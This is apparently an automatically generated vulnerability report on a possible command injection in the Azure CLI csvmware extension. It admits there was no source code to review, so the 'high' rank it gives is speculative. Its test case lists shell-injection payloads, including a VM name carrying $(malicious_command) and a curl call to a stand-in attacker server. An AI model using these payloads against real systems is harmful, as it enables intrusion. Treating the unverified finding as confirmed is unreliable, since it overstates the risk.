- vulnerability name: Potential Command Injection Vulnerability
  description: |
      The Azure VMware Solutions by CloudSimple Extension for Azure CLI might be vulnerable to command injection.
      This vulnerability could be triggered if user-provided input to the Azure CLI extension commands is not properly sanitized before being used in system calls or API requests within the Python codebase.
      An attacker could craft malicious input containing shell commands. If this input is not correctly sanitized and is then passed to a vulnerable function (e.g., `subprocess.run`, `os.system`, or similar functions that execute shell commands or construct API requests), it could lead to arbitrary command execution on the system running the Azure CLI.

      Steps to trigger vulnerability:
      1. An attacker crafts a malicious input string that includes shell commands.
      2. The attacker uses this malicious input as a parameter value for an Azure CLI csvmware command.
      3. If the Azure CLI extension code does not properly sanitize this input, and passes it to a system call or API request construction function.
      4. The system executes the injected commands, potentially granting the attacker unauthorized access or control over the system running the Azure CLI.
  impact: |
      Successful command injection can lead to severe security breaches.
      An attacker could execute arbitrary commands on the system where the Azure CLI is running.
      This could allow the attacker to:
      - Gain unauthorized access to sensitive data, including Azure credentials stored in the CLI configuration.
      - Modify system configurations.
      - Install malware or backdoors.
      - Pivot to other systems or resources accessible from the compromised system.
      - Cause denial of service.
  vulnerability rank: high
  currently implemented mitigations: |
      The provided project files do not contain source code, so it is impossible to determine if mitigations against command injection are currently implemented.
      Review of `SECURITY.md` suggests responsible vulnerability reporting through MSRC, but doesn't describe specific implemented mitigations in code.
  missing mitigations: |
      Input sanitization is crucial to prevent command injection. Missing mitigations might include:
      - Input validation: Implement strict validation and sanitization of all user inputs to Azure CLI extension commands.
      - Parameterized queries/commands: Use parameterized queries or commands for system calls and API interactions to prevent malicious injection.
      - Avoidance of system calls: Where possible, avoid using system calls that directly execute shell commands with user-provided input. Use safer alternatives or libraries that handle input sanitization.
  preconditions: |
      - The attacker needs to identify a vulnerable parameter in one of the Azure CLI csvmware commands that is processed in an unsafe manner in the Python extension code.
      - The attacker needs to have the ability to execute Azure CLI commands with the csvmware extension installed.
  source code analysis: |
      The provided project files do not contain the Python source code of the Azure CLI extension.
      Therefore, a detailed source code analysis to pinpoint the exact location of the vulnerability and confirm its existence is not possible with the given information.
      To perform a proper source code analysis, access to the Python (`.py`) files containing the command implementations would be required.

      Without the source code, we can only highlight the *potential* risk based on the nature of Azure CLI extensions and the general threat of command injection in such tools.

  security test case: |
      Due to the lack of access to the source code, a precise security test case targeting a specific vulnerability is not possible.
      However, a general test case to probe for command injection vulnerabilities can be designed:

      1. Setup:
         - Install the Azure CLI.
         - Install the `csvmware` extension for Azure CLI: `az extension add -n csvmware`.
         - Login to Azure CLI with valid credentials.

      2. Test:
         - Identify Azure CLI csvmware commands that take user input, especially strings that could potentially be passed to system calls or API requests (e.g., VM names, resource pool names, network names, etc.).
         - For each identified command parameter, craft malicious input strings containing shell commands. Examples of malicious input strings:
           - `"$(malicious_command)"`
           -  ```backticks
              `malicious_command`
              ```
           - `; malicious_command`
           - `| malicious_command`
           - For example, when creating a VM, try to inject commands into the VM name:
             `az csvmware vm create -g <resource-group> -n "$(malicious_command)" -p <private-cloud> -r <resource-pool> --template <template> --location <location>`
             Replace `<resource-group>`, `<private-cloud>`, `<resource-pool>`, `<template>`, and `<location>` with valid values. Replace `malicious_command` with a simple command like `whoami > /tmp/pwned.txt` or `curl <attacker_server>`.

      3. Expected result:
         - If the system is vulnerable to command injection, the `malicious_command` would be executed on the system running Azure CLI.
         - Check for side effects of the injected command. For example, in the test case above:
           - Check if the file `/tmp/pwned.txt` is created and contains the output of the `whoami` command.
           - Check if a network connection is established to `<attacker_server>` using network monitoring tools (like `tcpdump` or Wireshark).

      4. Rank:
         - If command injection is successful, classify the vulnerability as Critical or High, depending on the ease of exploitation and potential impact. If the test does not show command injection, further source code review would be needed to confirm the absence of this vulnerability or to identify other types of vulnerabilities.
